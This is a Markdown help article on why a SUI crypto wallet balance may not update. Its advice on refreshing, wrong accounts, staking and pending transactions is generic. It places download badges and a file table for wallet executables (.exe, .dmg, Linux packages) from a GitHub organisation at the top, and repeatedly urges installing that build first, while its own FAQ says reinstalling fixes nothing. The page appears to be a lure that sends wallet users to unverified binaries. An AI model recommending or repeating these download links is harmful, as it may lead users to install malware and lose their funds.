![SUI Wallet](assets/banner-article.png)

# SUI Wallet balance not updating

A stale balance is a refresh or a network question, not a missing deposit.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A balance that lags is usually the app showing a figure it read earlier while the network has moved on;
refreshing the account re-reads the chain. If the balance is zero after a restore, the account on screen is
the wrong one rather than the funds gone. Both cases are diagnosable in a minute, and neither needs a
reinstall.

## Refresh first, and what it does

Refreshing re-reads the account from the network. It is not a reload of the page you are looking at - it
discards the cached figure and asks again, which is the difference between a screen that looks stuck and a
screen that is stuck.

If the number changes on refresh, the app was behind and the chain was right. If it does not change, the
question moves to whether the transaction is included at all, which is the pending article's territory
rather than this one.

Refreshing is also the first thing to try after a network stall, because a stall leaves every cached
figure behind at once: when the network recovers, the app still shows what it read before, and one refresh
is usually the whole fix.

## The wrong-account case

A zero balance after a restore is the most alarming version of this problem and the least dangerous. The
restore derived an account; the app is showing that account; if the address is not the one that held the
funds, the balance is correctly zero.

Check the address against the one you expected before doing anything else.
[Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) covers what the app shows before it reports success,
which is how you tell a wrong phrase from an empty account.

## What the total does not include

Staked SUI is committed to a position, so it is not part of the spendable balance - which makes a wallet
look emptier than it is and makes a staking action look like a disappearance. The staking screen shows the
position; the balance shows what is free.

Rewards follow the same logic: they accrue inside the position and return with the principal on unstake
rather than arriving as a separate deposit each epoch. Sending from a staked position is not possible
without unstaking first, which is why the spendable figure is the one the send form cares about. A reader watching for a reward payment that never
appears is watching for something the product does not do.
[Unstaking SUI and epoch timing](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/unstaking-sui-and-epoch-timing.md) covers what comes back and when.

## A transaction that has not confirmed

An outgoing transfer reduces the balance when it is included, not when it is signed. An incoming one
appears when it is included too, so a sender who has already sent can be telling you the truth while your
screen still shows the old number.

Check whether the transaction exists on the chain before concluding that the wallet lost it.
[Why is my Sui transaction pending?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/why-is-my-sui-transaction-pending.md) covers the three states that look identical from the outside.

## When the number is right and the reader is wrong

Three ordinary confusions produce a "wrong balance" report. The selected account is not the one the reader
has in mind. The balance shown is spendable, so staked funds are excluded. Or the figure was read on a
different network than the one the funds arrived on.

Each is worth thirty seconds of checking, and each is cheaper than the alternative explanation people reach
for first, which is that the wallet has lost their money.

A fourth case is worth naming: two accounts with similar balances, switched by accident. The selector
answers it, and the address on screen is the check that settles which account the figure belongs to.

## When it is a genuine fault

Two signals point at the app rather than at the reader: the balance disagrees with what an explorer shows
for the same address, and refreshing does not resolve it. That is the case for the current release - the
reported problems are fixed there, and an older build is where a stale or ambiguous state comes from.

Install the current release from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest),
then refresh. A balance that still disagrees with an explorer for the same address, after a refresh, is
the clearest signal of all. If a provider-side error appears, it is the provider and not the wallet: the
panel's network line says which network the app is talking to, and a sync error names the service that
failed.

## FAQ

### Why does my balance show zero after a deposit?

Either the transaction is not included yet, or the account on screen is not the one that received it. Check
the address first, then the transaction.

### Why am I seeing a sync error or a 502?

A 502 comes from a service the app talks to, not from the wallet's own logic. Refresh; if it persists,
check the network line in the diagnostics panel and try again later.

### Why does the portfolio fail to load with an error?

The portfolio view reads more data than a single account balance does, so it can fail while the balance
loads. The account balance is the figure that matters for sending.

### My rewards are not arriving. Is that a bug?

Rewards accrue inside the staking position and return with the principal when you unstake; they are not a
separate payment. The staking screen shows the position growing.

### Does reinstalling fix a stuck balance?

No. Reinstalling removes the app and re-reads nothing. Refresh, check the address, then update if the
figures still disagree with an explorer.
